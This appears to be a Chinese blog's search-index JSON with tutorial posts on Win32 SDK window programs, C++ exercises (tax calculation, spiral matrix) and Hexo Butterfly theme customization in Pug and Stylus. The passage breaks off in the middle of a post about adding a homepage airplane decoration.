hInstance, HINSTANCE hPrevInstance, PSTR szCmdLine, int iCmdShow)&#123; static TCHAR szAppName[] = TEXT(&quot;MyWindows&quot;); HWND hwnd; MSG msg; WNDCLASS wndclass; wndclass.style = CS_HREDRAW | CS_VREDRAW; wndclass.lpfnWndProc = WndProc; wndclass.cbClsExtra = 0; wndclass.cbWndExtra = 0; wndclass.hInstance = hInstance; wndclass.hIcon = LoadIcon(NULL, IDI_APPLICATION); wndclass.hCursor = LoadCursor(NULL, IDC_ARROW); wndclass.hbrBackground = (HBRUSH)GetStockObject(WHITE_BRUSH); wndclass.lpszMenuName = NULL; wndclass.lpszClassName = szAppName; if (!RegisterClass(&amp;wndclass)) &#123; MessageBox(NULL, TEXT(&quot;这个程序需要在 Windows NT 才能执行！&quot;), szAppName, MB_ICONERROR); return 0; &#125; hwnd = CreateWindow(szAppName, TEXT(&quot;快乐小凳凳&quot;), WS_OVERLAPPEDWINDOW | WS_VSCROLL, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, NULL, NULL, hInstance, NULL); ShowWindow(hwnd, iCmdShow); UpdateWindow(hwnd); while (GetMessage(&amp;msg, NULL, 0, 0)) &#123; TranslateMessage(&amp;msg); DispatchMessage(&amp;msg); &#125; return msg.wParam;&#125;LRESULT CALLBACK WndProc(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)&#123; HDC hdc; PAINTSTRUCT ps; TEXTMETRIC tm; TCHAR szBuffer[10]; static int cxChar, cxCaps, cyChar, cxClient, cyClient, iVscrollPos; size_t iTarget; int i, y; switch (message) &#123; case WM_CREATE: hdc = GetDC(hwnd); GetTextMetrics(hdc, &amp;tm); cxChar = tm.tmAveCharWidth; cxCaps = (tm.tmPitchAndFamily &amp; 1 ? 3 : 2) * cxChar / 2; cyChar = tm.tmHeight + tm.tmExternalLeading; ReleaseDC(hwnd, hdc); SetScrollRange(hwnd, SB_VERT, 0, NUMLINES - 1, FALSE); SetScrollPos(hwnd, SB_VERT, 0, TRUE); return 0; case WM_SIZE: cxClient = LOWORD(lParam); cyClient = HIWORD(lParam); return 0; case WM_VSCROLL: hdc = GetDC(hwnd); SetTextAlign(hdc, TA_TOP | TA_RIGHT); switch (LOWORD(wParam)) &#123; case SB_LINEUP: iVscrollPos -= 1; break; case SB_LINEDOWN: iVscrollPos += 1; break; case SB_PAGEUP: iVscrollPos -= cyClient / cyChar; break; case SB_PAGEDOWN: iVscrollPos += cyClient / cyChar; break; case SB_THUMBPOSITION: iVscrollPos = HIWORD(wParam); break; &#125; ReleaseDC(hwnd, hdc); iVscrollPos = max(0, min(iVscrollPos, NUMLINES - 1)); if (iVscrollPos != GetScrollPos(hwnd, SB_VERT)) &#123; SetScrollPos(hwnd, SB_VERT, iVscrollPos, TRUE); InvalidateRect(hwnd, NULL, TRUE); UpdateWindow(hwnd); &#125; return 0; case WM_PAINT: hdc = BeginPaint(hwnd, &amp;ps); for (i = 0; i &lt; NUMLINES; i++) &#123; y = cyChar * (i - iVscrollPos); StringCchLength(sysmetrics[i].szLabel, 1024, &amp;iTarget); TextOut(hdc, 0, y, sysmetrics[i].szLabel, iTarget); StringCchLength(sysmetrics[i].szDesc, 1024, &amp;iTarget); TextOut(hdc, 22 * cxCaps, y, sysmetrics[i].szDesc, iTarget); SetTextAlign(hdc, TA_RIGHT | TA_TOP); StringCchPrintf(szBuffer, 10, TEXT(&quot;%5d&quot;), GetSystemMetrics(sysmetrics[i].iIndex)); StringCchLength(szBuffer, 10, &amp;iTarget); TextOut(hdc, 22 * cxCaps + 40 * cxChar, y, szBuffer, iTarget); SetTextAlign(hdc, TA_LEFT | TA_TOP); &#125; EndPaint(hwnd, &amp;ps); return 0; case WM_DESTROY: PostQuitMessage(0); return 0; &#125; return DefWindowProc(hwnd, message, wParam, lParam);&#125;","tags":"winsdk程序"},{"title":"获取设备分辨率","url":"/post/a8660f0b.html","text":"分析：利用GetSystemMetrics函数获取设备尺寸： GetSystemMetrics(SM_CXSCREEN)返回设备宽度(px) GetSystemMetrics(SM_CYSCREEN);返回设备高度(px) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778#include &lt;windows.h&gt;#include &lt;strsafe.h&gt;LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR CmdLine, int iCmdShow)&#123; static TCHAR szAppName[] = TEXT(&quot;MyWindows&quot;); // 注意使用TEXT包裹语句 HWND hwnd; // 窗口句柄 MSG msg; // 消息结构 WNDCLASS wndclass; // 窗口类, 定义窗口基本属性 wndclass.style = CS_HREDRAW | CS_VREDRAW; // CS-&gt;ClassStyle, H-&gt;horizontal 水平的, V-&gt;vertical 垂直的, redraw 重绘 wndclass.lpfnWndProc = WndProc; // 指定窗口过程(回调函数) wndclass.cbClsExtra = 0; wndclass.cbWndExtra = 0; // 预留的额外空间, 一般设为0 wndclass.hInstance = hInstance; wndclass.hIcon = LoadIcon(NULL, IDI_APPLICATION); // 设定图标 wndclass.hCursor = LoadCursor(NULL, IDC_ARROW); // 设定光标 wndclass.hbrBackground = (HBRUSH)GetStockObject(WHITE_BRUSH); // 窗口背景色 wndclass.lpszMenuName = NULL; // 菜单名字 wndclass.lpszClassName = szAppName; // 窗口类名 if (!RegisterClass(&amp;wndclass)) // 注册窗口, 注册成功返回ATOM类型(对应了字符串在ATOM表的位置); 注册失败返回0 &#123; MessageBox(NULL, TEXT(&quot;这个程序需要在Windows NT才能执行!&quot;), szAppName, MB_ICONERROR); &#125; hwnd = CreateWindow(szAppName, TEXT(&quot;快乐小凳凳&quot;), WS_OVERLAPPEDWINDOW, // 窗口风格 CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, NULL, NULL, hInstance, NULL ); ShowWindow(hwnd, iCmdShow); UpdateWindow(hwnd); while (GetMessage(&amp;msg, NULL, 0, 0)) &#123; TranslateMessage(&amp;msg); DispatchMessage(&amp;msg); &#125; return msg.wParam;&#125;LRESULT CALLBACK WndProc(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)&#123; HDC hdc; PAINTSTRUCT ps; RECT rect; static int cxClient, cyClient; TCHAR szBuffer[128]; switch (message) &#123; case WM_PAINT: hdc = BeginPaint(hwnd, &amp;ps); GetClientRect(hwnd, &amp;rect); cxClient = GetSystemMetrics(SM_CXSCREEN); cyClient = GetSystemMetrics(SM_CYSCREEN); StringCchPrintf(szBuffer, 128, TEXT(&quot;当前显示器的分辨率是: %d * %d px&quot;), cxClient, cyClient); DrawText(hdc, szBuffer, -1, &amp;rect, DT_SINGLELINE | DT_CENTER | DT_VCENTER); EndPaint(hwnd, &amp;ps); return 0; case WM_DESTROY: PostQuitMessage(0); // 正式关闭窗口 return 0; &#125; return DefWindowProc(hwnd, message, wParam, lParam);&#125;","tags":"winsdk程序"},{"title":"设置字母尺寸","url":"/post/fd3620e9.html","text":"分析：在WM_CREATE消息中获取字母宽度与高度修改后存入变量，在WM_PAINT消息中打印时直接在TextOut函数里面使用变量进行设置 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889#include &lt;windows.h&gt;#include &lt;strsafe.h&gt;LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR CmdLine, int iCmdShow)&#123; static TCHAR szAppName[] = TEXT(&quot;MyWindows&quot;); // 注意使用TEXT包裹语句 HWND hwnd; // 窗口句柄 MSG msg; // 消息结构 WNDCLASS wndclass; // 窗口类, 定义窗口基本属性 wndclass.style = CS_HREDRAW | CS_VREDRAW; // CS-&gt;ClassStyle, H-&gt;horizontal 水平的, V-&gt;vertical 垂直的, redraw 重绘 wndclass.lpfnWndProc = WndProc; // 指定窗口过程(回调函数) wndclass.cbClsExtra = 0; wndclass.cbWndExtra = 0; // 预留的额外空间, 一般设为0 wndclass.hInstance = hInstance; wndclass.hIcon = LoadIcon(NULL, IDI_APPLICATION); // 设定图标 wndclass.hCursor = LoadCursor(NULL, IDC_ARROW); // 设定光标 wndclass.hbrBackground = (HBRUSH)GetStockObject(WHITE_BRUSH); // 窗口背景色 wndclass.lpszMenuName = NULL; // 菜单名字 wndclass.lpszClassName = szAppName; // 窗口类名 if (!RegisterClass(&amp;wndclass)) // 注册窗口, 注册成功返回ATOM类型(对应了字符串在ATOM表的位置); 注册失败返回0 &#123; MessageBox(NULL, TEXT(&quot;这个程序需要在Windows NT才能执行!&quot;), szAppName, MB_ICONERROR); &#125; hwnd = CreateWindow(szAppName, TEXT(&quot;快乐小凳凳&quot;), WS_OVERLAPPEDWINDOW, // 窗口风格 CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, NULL, NULL, hInstance, NULL ); ShowWindow(hwnd, iCmdShow); UpdateWindow(hwnd); while (GetMessage(&amp;msg, NULL, 0, 0)) &#123; TranslateMessage(&amp;msg); DispatchMessage(&amp;msg); &#125; return msg.wParam;&#125;LRESULT CALLBACK WndProc(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)&#123; HDC hdc; PAINTSTRUCT ps; RECT rect; TCHAR szBuffer[128]; int i; size_t iTarget; TEXTMETRIC tm; static int cxChar, cyChar; switch (message) &#123; case WM_CREATE: hdc = GetDC(hwnd); GetTextMetrics(hdc, &amp;tm); cxChar = tm.tmAveCharWidth; // 平均宽度(大写字母一般取平均宽度的1.5倍) cyChar = tm.tmHeight + tm.tmExternalLeading; ReleaseDC(hwnd, hdc); return 0; case WM_PAINT: hdc = BeginPaint(hwnd, &amp;ps); for (i = 0; i &lt; 10; i++) &#123; StringCchPrintf(szBuffer, 128, TEXT(&quot;%d: %s&quot;), i + 1, TEXT(&quot;I love WY!&quot;)); StringCchLength(szBuffer, 128, &amp;iTarget); TextOut(hdc, cxChar, i * cyChar, szBuffer, iTarget); &#125; EndPaint(hwnd, &amp;ps); return 0; case WM_DESTROY: PostQuitMessage(0); // 正式关闭窗口 return 0; &#125; return DefWindowProc(hwnd, message, wParam, lParam);&#125;","tags":"winsdk程序"},{"title":"实时获取鼠标位置","url":"/post/720c035f.html","text":"分析：窗口框架直接搬过来，修改回调函数WndProc，利用WM_MOUSEMOVE消息中的lParam参数获取实时鼠标位置并输出在左上角 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980#include &lt;windows.h&gt;#include &lt;strsafe.h&gt;LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR CmdLine, int iCmdShow)&#123; static TCHAR szAppName[] = TEXT(&quot;MyWindows&quot;); // 注意使用TEXT包裹语句 HWND hwnd; // 窗口句柄 MSG msg; // 消息结构 WNDCLASS wndclass; // 窗口类, 定义窗口基本属性 wndclass.style = CS_HREDRAW | CS_VREDRAW; // CS-&gt;ClassStyle, H-&gt;horizontal 水平的, V-&gt;vertical 垂直的, redraw 重绘 wndclass.lpfnWndProc = WndProc; // 指定窗口过程(回调函数) wndclass.cbClsExtra = 0; wndclass.cbWndExtra = 0; // 预留的额外空间, 一般设为0 wndclass.hInstance = hInstance; wndclass.hIcon = LoadIcon(NULL, IDI_APPLICATION); // 设定图标 wndclass.hCursor = LoadCursor(NULL, IDC_ARROW); // 设定光标 wndclass.hbrBackground = (HBRUSH)GetStockObject(WHITE_BRUSH); // 窗口背景色 wndclass.lpszMenuName = NULL; // 菜单名字 wndclass.lpszClassName = szAppName; // 窗口类名 if (!RegisterClass(&amp;wndclass)) // 注册窗口, 注册成功返回ATOM类型(对应了字符串在ATOM表的位置); 注册失败返回0 &#123; MessageBox(NULL, TEXT(&quot;这个程序需要在Windows NT才能执行!&quot;), szAppName, MB_ICONERROR); &#125; hwnd = CreateWindow(szAppName, TEXT(&quot;快乐小凳凳&quot;), WS_OVERLAPPEDWINDOW, // 窗口风格 CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, NULL, NULL, hInstance, NULL ); ShowWindow(hwnd, iCmdShow); UpdateWindow(hwnd); while (GetMessage(&amp;msg, NULL, 0, 0)) &#123; TranslateMessage(&amp;msg); DispatchMessage(&amp;msg); &#125; return msg.wParam;&#125;LRESULT CALLBACK WndProc(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)&#123; HDC hdc; PAINTSTRUCT ps; RECT rect; switch (message) &#123; case WM_MOUSEMOVE: int x = LOWORD(lParam); int y = HIWORD(lParam); // 在WM_MOUSEMOVE消息中lParam的高16位为鼠标纵坐标，低16位为鼠标横坐标 wchar_t str[100]; StringCchPrintf(str, 100, TEXT(&quot;当前鼠标位置: (%d, %d)&quot;), x, y); SetWindowText(hwnd, str); case WM_PAINT: hdc = BeginPaint(hwnd, &amp;ps); GetClientRect(hwnd, &amp;rect); DrawText(hdc, TEXT(&quot;当前鼠标位置请看左上角^_^&quot;), -1, &amp;rect, DT_SINGLELINE | DT_CENTER | DT_VCENTER); EndPaint(hwnd, &amp;ps); return 0; case WM_DESTROY: PostQuitMessage(0); // 正式关闭窗口 return 0; &#125; return DefWindowProc(hwnd, message, wParam, lParam);&#125;","tags":"winsdk程序"},{"title":"第一个完整窗口","url":"/post/70294708.html","text":"12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273#include &lt;windows.h&gt;LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR CmdLine, int iCmdShow)&#123; static TCHAR szAppName[] = TEXT(&quot;MyWindows&quot;); // 注意使用TEXT包裹语句 HWND hwnd; // 窗口句柄 MSG msg; // 消息结构 WNDCLASS wndclass; // 窗口类, 定义窗口基本属性 wndclass.style = CS_HREDRAW | CS_VREDRAW; // CS-&gt;ClassStyle, H-&gt;horizontal 水平的, V-&gt;vertical 垂直的, redraw 重绘 wndclass.lpfnWndProc = WndProc; // 指定窗口过程(回调函数) wndclass.cbClsExtra = 0; wndclass.cbWndExtra = 0; // 预留的额外空间, 一般设为0 wndclass.hInstance = hInstance; wndclass.hIcon = LoadIcon(NULL, IDI_APPLICATION); // 设定图标 wndclass.hCursor = LoadCursor(NULL, IDC_ARROW); // 设定光标 wndclass.hbrBackground = (HBRUSH)GetStockObject(WHITE_BRUSH); // 窗口背景色 wndclass.lpszMenuName = NULL; // 菜单名字 wndclass.lpszClassName = szAppName; // 窗口类名 if (!RegisterClass(&amp;wndclass)) // 注册窗口, 注册成功返回ATOM类型(对应了字符串在ATOM表的位置); 注册失败返回0 &#123; MessageBox(NULL, TEXT(&quot;这个程序需要在Windows NT才能执行!&quot;), szAppName, MB_ICONERROR); &#125; hwnd = CreateWindow(szAppName, TEXT(&quot;快乐小凳凳&quot;), WS_OVERLAPPEDWINDOW, // 窗口风格 CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, NULL, NULL, hInstance, NULL ); ShowWindow(hwnd, iCmdShow); UpdateWindow(hwnd); while (GetMessage(&amp;msg, NULL, 0, 0)) &#123; TranslateMessage(&amp;msg); DispatchMessage(&amp;msg); &#125; return msg.wParam;&#125;LRESULT CALLBACK WndProc(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)&#123; HDC hdc; PAINTSTRUCT ps; char *str = TEXT(&quot;大家好, 这是我的第一个窗口程序!&quot;); RECT rect; switch (message) &#123; case WM_PAINT: hdc = BeginPaint(hwnd, &amp;ps); GetClientRect(hwnd, &amp;rect); DrawText(hdc, TEXT(&quot;大家好, 这是我的第一个窗口程序!&quot;), -1, &amp;rect, DT_SINGLELINE | DT_CENTER | DT_VCENTER); EndPaint(hwnd, &amp;ps); return 0; case WM_DESTROY: PostQuitMessage(0); // 正式关闭窗口 return 0; &#125; return DefWindowProc(hwnd, message, wParam, lParam);&#125;","tags":"winsdk程序"},{"title":"switch+level实现税后工资计算","url":"/post/473fce30.html","text":"前言switch+level这个办法是以前C语言老师教的，当时觉得好厉害~ 【问题描述】 小明的公司每个月给小明发工资，而小明拿到的工资为交完个人所得税之后的工资。假设他一个月的税前工资（扣除五险一金后、未扣税前的工资）为S元，则他应交的个人所得税按如下公式计算： 1） 个人所得税起征点为3500元，若S不超过3500，则不交税，3500元以上的部分才计算个人所得税，令A=S-3500元； 2） A中不超过1500元的部分，税率3%； 3） A中超过1500元未超过4500元的部分，税率10%； 4） A中超过4500元未超过9000元的部分，税率20%； 5） A中超过9000元未超过35000元的部分，税率25%； 6） A中超过35000元未超过55000元的部分，税率30%； 7） A中超过55000元未超过80000元的部分，税率35%； 8） A中超过80000元的部分，税率45%； 例如，如果小明的税前工资为10000元，则A=10000-3500=6500元，其中不超过1500元部分应缴税1500×3%=45元，超过1500元不超过4500元部分应缴税(4500-1500)×10%=300元，超过4500元部分应缴税(6500-4500)×20%=400元。总共缴税745元，税后所得为9255元。 已知小明这个月税前所得为T元，请问他的税后工资S是多少元。 【输入形式】 输入的第一行包含一个整数T，表示小明的税前所得。 【输出形式】 输出一个整数S，表示小明的税后工资。 【样例输入】 10000 【样例输出】 9255 代码分析： 逆向思维，从高税率开始计算。 首先判断税前工资达到了缴税的哪一档，每超过一档level++，然后通过switch对每一档的金额计算应缴纳的税务。 123456789101112131415161718192021222324252627282930313233343536373839404142434445#include &lt;iostream&gt;using namespace std;int calculate(int s)&#123; int s_ = s - 3500; int sum = 0; int level = (s_ &gt;= 0) + (s_ &gt;= 1500) + (s_ &gt;= 4500) + (s_ &gt;= 9000) + (s_ &gt;= 35000) + (s_ &gt;= 55000) + (s_ &gt;= 80000); switch (level) &#123; case 7: sum += (s_ - 80000) * 0.45; s_ = 80000; case 6: sum += (s_ - 55000) * 0.35; s_ = 55000; case 5: sum += (s_ - 35000) * 0.3; s_ = 35000; case 4: sum += (s_ - 9000) * 0.25; s_ = 9000; case 3: sum += (s_ - 4500) * 0.2; s_ = 4500; case 2: sum += (s_ - 1500) * 0.1; s_ = 1500; case 1: sum += s_ * 0.03; &#125; return s - sum;&#125;int main()&#123; int s; cout &lt;&lt; &quot;请输入税前工资(元)：&quot;; cin &gt;&gt; s; s = calculate(s); cout &lt;&lt; &quot;您的税后工资为：&quot; &lt;&lt; s &lt;&lt; &quot;元&quot;;&#125;","tags":"c++刷题"},{"title":"蛇形打印","url":"/post/1fbe3173.html","text":"【问题描述】蛇形填数 在n×n方阵里填入1，2，…，n×n，要求填成蛇形。例如，n＝4时方阵为： 1234567 1 2 3 412 13 14 511 16 15 610 9 8 7 为了美化效果，我们设置每个数宽度为4，填充符号为*。先输入n值，n≤10。 【样例输入】14 【样例输出】1234567***1***2***3***4**12**13**14***5**11**16**15***6**10***9***8***7 分析：总循环次数为n / 2，每一次循环打印一圈，每一圈分为四条边，每条边的定位和长度与循环的当前次数关联 ps：使用动态二维数组可以保证n的值随意设定；要使用普通二维数组的话把num重新定义并删除初始化动态二维数组即可 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#include &lt;iostream&gt;#include &lt;iomanip&gt;#include &lt;vector&gt;using namespace std;int main()&#123; int n, res = 1; vector&lt;vector&lt;int&gt;&gt; num; vector&lt;int&gt; temp; cin &gt;&gt; n; // 初始化动态二维数组 for (int i = 0; i &lt; n; ++i) &#123; temp.clear(); for (int j = 0; j &lt; n; ++j) &#123; temp.push_back(0); &#125; num.push_back(temp); &#125; for (int i = 0; i &lt;= n / 2; ++i) // 总循环圈数 &#123; for (int j = i; j &lt; n - i - 1; ++j) &#123; num[i][j] = res++; &#125; // 上边 for (int j = i; j &lt; n - i - 1; ++j) &#123; num[j][n - i - 1] = res++; &#125; // 右边 for (int j = n - i - 1; j &gt; i; --j) &#123; num[n - i - 1][j] = res++; &#125; // 下边 for (int j = n - i - 1; j &gt; i; --j) &#123; num[j][i] = res++; &#125; // 左边 &#125; if (n % 2 != 0) num[n/2][n/2] = res; // n为奇数时正中间的数字未赋值就会退出循环，在此补上 for (int i = 0; i &lt; n; ++i) &#123; for (int j = 0; j &lt; n; ++j) &#123; cout &lt;&lt; setw(4) &lt;&lt; setfill(&#x27;*&#x27;) &lt;&lt; right &lt;&lt; num[i][j]; &#125; cout &lt;&lt; endl; &#125; return 0;&#125;","tags":"c++刷题"},{"title":"魔改友人帐","url":"/post/9a58847d.html","text":"前言转载自：给butterfly添加不一样的友链 效果预览 魔改步骤 在Blog根目录下打开终端，输入 1hexo new page link 打开[Blogroot]\\source\\link\\index.md,添加一行type: &#39;link&#39;: 12345---title: 友人帐date: 2020-12-01 22:19:45type: &#x27;link&#x27;--- 新建文件[Blogroot]\\source\\_data\\link.yml，输入： 注：样式可选择，以下均使用flexcard，butterfly样式可以自行体会 1flink_style: flexcard || butterfly 12345678- class_name: 推荐博客 flink_style: flexcard link_list: - name: 快乐小凳凳`Blog link: https://www.dqywy.top/ avatar: https://s1.ax1x.com/2023/05/21/p95hrtI.png descr: Sow nothing, reap nothing. siteshot: https://s1.ax1x.com/2023/06/03/pCp6HHA.png 取消[Blogroot]\\_config.butterfly.yml中menu配置项内link页面的注释。 12345678910menu: Home: / || fas fa-home Archives: /archives/ || fas fa-archive Tags: /tags/ || fas fa-tags Categories: /categories/ || fas fa-folder-open # List||fas fa-list: # - Music || /music/ || icon-music # - Movie || /movies/ || fas fa-video Link: /link/ || fas fa-link # About: /about/ || fas fa-heart 替换[Blogroot]\\themes\\butterfly\\layout\\includes\\page\\flink.pug 注：下列代码在鱼佬的代码基础上对avatar添加了链接(32行，35行)，以便移动端适配 123456789101112131415161718192021222324252627282930313233343536373839404142#article-container if top_img === false h1.page-title= page.title .flink if site.data.link each i in site.data.link if i.class_name h2!= i.class_name if i.class_desc .flink-desc!=i.class_desc if i.flink_style === &#x27;butterfly&#x27; .butterfly-flink-list each item in i.link_list .flink-list-item a(href=url_for(item.link) title=item.name target=&quot;_blank&quot;) .flink-item-icon if theme.lazyload.enable img(data-lazy-src=url_for(item.avatar) onerror=`this.onerror=null;this.src=&#x27;` + url_for(theme.error_img.flink) + `&#x27;` alt=item.name ) else img(src=url_for(item.avatar) onerror=`this.onerror=null;this.src=&#x27;` + url_for(theme.error_img.flink) + `&#x27;` alt=item.name ) .flink-item-info .flink-item-name= item.name .flink-item-desc(title=item.descr)= item.descr else if i.flink_style === &#x27;flexcard&#x27; .flexcard-flink-list each item in i.link_list a.flink-list-card(href=url_for(item.link) target=&#x27;_blank&#x27; data-title=item.descr) .wrapper.cover - var siteshot = item.siteshot ? url_for(item.siteshot) : &#x27;https://image.thum.io/get/width/400/crop/800/allowJPG/wait/20/noanimate/&#x27; + item.link if theme.lazyload.enable img.cover.fadeIn(data-lazy-src=siteshot onerror=`this.onerror=null;this.src=&#x27;` + url_for(theme.error_img.post_page) + `&#x27;` alt=&#x27;&#x27; ) img.cover.fadeIn(data-lazy-src=avatar onerror=`this.onerror=null;this.src=&#x27;` + url_for(theme.error_img.post_page) + `&#x27;` alt=&#x27;&#x27; ) else img.cover.fadeIn(src=siteshot onerror=`this.onerror=null;this.src=&#x27;` + url_for(theme.error_img.post_page) + `&#x27;` alt=&#x27;&#x27; ) img.cover.fadeIn(data-lazy-src=avatar onerror=`this.onerror=null;this.src=&#x27;` + url_for(theme.error_img.post_page) + `&#x27;` alt=&#x27;&#x27; ) .info if theme.lazyload.enable img.flink-avatar(data-lazy-src=url_for(item.avatar) onerror=`this.onerror=null;this.src=&#x27;` + url_for(theme.error_img.flink) + `&#x27;` alt=&#x27;&#x27; ) else img(src=url_for(item.avatar) onerror=`this.onerror=null;this.src=&#x27;` + url_for(theme.error_img.flink) + `&#x27;` alt=&#x27;&#x27; ) span.flink-sitename= item.name != page.content 替换[Blogroot]\\themes\\butterfly\\source\\css\\_page\\flink.styl 注：下列代码在鱼佬的代码基础上对avatar禁用点击(176行)，避免移动端点击头像后放大头像导致无法跳转 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238.flink-desc margin: .2rem 0 .5rem.butterfly-flink-list overflow: auto padding: 10px 10px 0 text-align: center &amp; &gt; .flink-list-item position: relative float: left overflow: hidden line-height: 17px -webkit-transform: translateZ(0) height: 100px; padding: 10px; width: calc(100% / 5 - 0.5rem) margin: 0.5rem 0.25rem; border-radius: 12px; border: var(--style-border); background-color: var(--anzhiyu-card-bg); -webkit-transition: all .3s ease-in-out; -moz-transition: all .3s ease-in-out; -o-transition: all .3s ease-in-out; -ms-transition: all .3s ease-in-out; transition: all .3s ease-in-out; +maxWidth1200() width: calc(50% - 15px) !important +maxWidth600() width: calc(100% - 15px) !important &amp;:hover border-color: var(--anzhiyu-main)!important; background-color: var(--anzhiyu-main)!important; box-shadow: var(--anzhiyu-shadow-theme)!important; .flink-item-icon width: 0; height: 0; margin-left: -10px; .flink-item-name,.flink-item-desc color: var(--anzhiyu-white); &amp;:hover:before, &amp;:focus:before, &amp;:active:before transform: scale(1) a color: var(--font-color) text-decoration: none .flink-item-icon float: left overflow: hidden margin: 15px 10px width: 60px height: 60px border-radius: 35px transition: all .3s ease-out margin: 8px 0 8px 0; background: var(--anzhiyu-background); border-radius: 50%; overflow: hidden; img width: 100% height: 100% transition: filter 375ms ease-in .2s, transform .3s object-fit: cover .img-alt display: none.flink-item-info display: flex; flex-wrap: wrap; padding-left: 10px; text-align: left; flex-direction: column; .flink-item-name @extend .limit-one-line padding: 12px 0 16px 0; height: auto; font-weight: bold font-size: 1.2em color: var(--anzhiyu-fontcolor); .flink-item-desc @extend .limit-one-line padding: 0 height: 35px font-size: .93em opacity: .7; color: var(--anzhiyu-fontcolor); word-break: break-all; white-space: break-spaces; display: -webkit-box; overflow: hidden; -webkit-box-orient: vertical; -webkit-line-clamp: 2;.flink-name margin-bottom: 5px font-weight: bold font-size: 1.5em#article-container img margin-bottom: 0.5rem; object-fit: cover; max-height: 900px;.flexcard-flink-list overflow hidden .flink-list-card .wrapper img transition: transform .5s ease-out !important; &amp;:hover border-color: var(--anzhiyu-main)!important; background-color: var(--anzhiyu-main)!important; box-shadow: var(--anzhiyu-shadow-theme)!important; &amp; &gt; a width: calc(100% / 5 - 0.5rem); height 150px position relative display block margin: 0.5rem 0.25rem; float left overflow hidden padding: 0; border-radius: 8px; transition all .3s ease 0s, transform .6s cubic-bezier(.6, .2, .1, 1) 0s box-shadow none border: var(--style-border)!important; &amp;:hover .info transform translateY(-100%) .wrapper img transform scale(1.2) &amp;::before position: fixed width:inherit margin:auto left:0 right:0 top:10% border-radius: 10px text-align: center z-index: 100 content: attr(data-title) font-size: 20px color: #fff padding: 10px background-color: rgba($theme-color,0.8) .cover width 100% transition transform .5s ease-out .wrapper position relative .fadeIn animation coverIn .8s ease-out forwards img height 150px pointer-events none .info display flex flex-direction column justify-content center align-items center width 100% height 100% pointer-events: none; overflow hidden border-radius 3px background-color hsla(0, 0%, 100%, .7) transition transform .5s cubic-bezier(.6, .2, .1, 1) 0s img position relative top 45px width 80px height 80px border-radius 50% box-shadow 0 0 10px rgba(0, 0, 0, .3) z-index 1 text-align center pointer-events none span padding 20px 10% 60px 10% font-size 16px width 100% text-align center box-shadow 0 0 10px rgba(0, 0, 0, .3) background-color hsla(0, 0%, 100%, .7) color var(--font-color) white-space nowrap overflow hidden text-overflow ellipsis.flexcard-flink-list&gt;a .info,.flexcard-flink-list&gt;a .wrapper .cover position absolute top 0 left 0@media screen and (max-width:1024px) .flexcard-flink-list &amp; &gt; a width calc(33.33333% - 15px)@media screen and (max-width:600px) .flexcard-flink-list &amp; &gt; a width calc(50% - 15px)[data-theme=dark] .flexcard-flink-list a .info, .flexcard-flink-list a .info span background-color rgba(0, 0, 0, .6) .flexcard-flink-list &amp; &gt; a &amp;:hover &amp;:before background-color: rgba(#121212,0.8);.justified-gallery &gt; div &gt; img,.justified-gallery &gt; figure &gt; img,.justified-gallery &gt; a &gt; a &gt; img,.justified-gallery &gt; div &gt; a &gt; img,.justified-gallery &gt; figure &gt; a &gt; img,.justified-gallery &gt; a &gt; svg,.justified-gallery &gt; div &gt; svg,.justified-gallery &gt; figure &gt; svg,.justified-gallery &gt; a &gt; a &gt; svg,.justified-gallery &gt; div &gt; a &gt; svg,.justified-gallery &gt; figure &gt; a &gt; svg position static!important","tags":"博客美化"},{"title":"首页添加玩具飞机","url":"/post/d7ec8f29.html","text":"前言转载自：飞只因太美，给你的首页装上吧！ 效果预览 步骤在BlogRoot/themes/butterfly/layout/includes/header文件夹下新建一个plane.pug文件具体位置如下图： 将以下代码复制到文件中。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697989910010110210310410510610710810911011111211311411511611711811912012112212312412512612712812913013113213313413513613713813914014114214314414514614714814915015115215315415515615715815916016116216316416516616716816917017117217317417517617717817918018118218318418518618718818919019119219319419519619719819920020120220320420520620720820921021121221321421521621721821922022122222322422522622722822923023123223323423523623723823924024124224324424524624724824925025125225325425525625725825926026126226326426526626726826927027127227327427527627727827928028128228328428528628728828929029129229329429529629729829930030130230330430530630730830931031131231331431531631731831932032132232332432532632732832933033133233333433533633733833934034134234334434534634734834935035135235335435535635735835936036136236336436536636736836937037137237337437537637737837938038138238338438538638738838939039139239339439539639739839940040140240340